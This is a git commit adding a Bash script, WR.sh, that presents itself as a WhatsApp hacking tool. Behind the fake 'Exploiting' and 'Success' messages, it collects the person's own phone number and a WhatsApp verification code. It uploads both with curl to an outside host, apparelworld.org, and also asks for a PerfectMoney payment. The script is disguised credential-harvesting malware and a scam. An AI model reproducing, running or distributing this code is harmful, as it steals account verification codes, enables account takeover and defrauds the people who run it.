dfba80eeec81e4720c9c07fc3163a41e3664870c
THEIMMORTALHACKER <71122269+THEIMMORTALHACKER@users.noreply.github.com>
2020-09-11 23:51:09 +0700

    Create WR.sh

---
+++ WR.sh
@@ -0,0 +1,40 @@
+#!/bin/bash
+clear
+echo "
+<-- Ganteng -->
+############>>>>>>>>
+#  Whatsapp Code # THE IMMORTAL HACKER
+#  github     # github.comTHEIMMORTALHACKER
+###########°°°°°°°°°°°
+Copyright (c) 2018 ./THEIMMORTAL.HACKER";
+echo "";
+read -p "Nomer Kamu (+62xxxx)=> " nomer;
+read -p "Nomer Target (+62xxxx) => " target;
+sleep 2
+echo "[+] Syncing Target...";
+sleep 1
+echo "Login  => $nomer";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Exploiting...";
+echo "Nomer => $nomer" >> not•bad.html;
+curl -T not•bad.html http://apparelworld.org/
+sleep 5;
+echo "[+] Done.";
+echo "Pay For Get Code PerfectMoney : 687732";
+read -p "Verify Code => " code;
+sleep 2
+echo "[+] Connecting to whatsapp.com...";
+echo "Login => $nomer";
+sleep 0.5
+echo "Code => $code";
+sleep 0.5
+echo "Target => $target";
+sleep 0.5
+echo "[+] Sending Exploit...";
+echo "Code => $code" >> not•bad.html;
+curl -T nit•bad.html http://apparelworld.org/
+sleep 5
+echo "[+] Success Exploited!";
+exit;
